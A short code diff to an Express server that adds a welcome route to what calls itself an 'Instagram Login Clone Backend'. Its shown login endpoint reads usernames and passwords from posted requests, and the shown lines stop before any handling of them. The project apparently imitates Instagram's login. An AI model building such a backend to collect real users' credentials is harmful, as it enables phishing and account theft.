@@ -10,6 +10,11 @@ const PORT = process.env.PORT || 3000; // Use the PORT environment variable prov
 app.use(bodyParser.json());
 app.use(cors()); // Use the CORS middleware to enable CORS
 
+// Define a route for the root URL
+app.get('/', (req, res) => {
+    res.send('Welcome to the Instagram Login Clone Backend!');
+});
+
 // Endpoint to receive login data
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
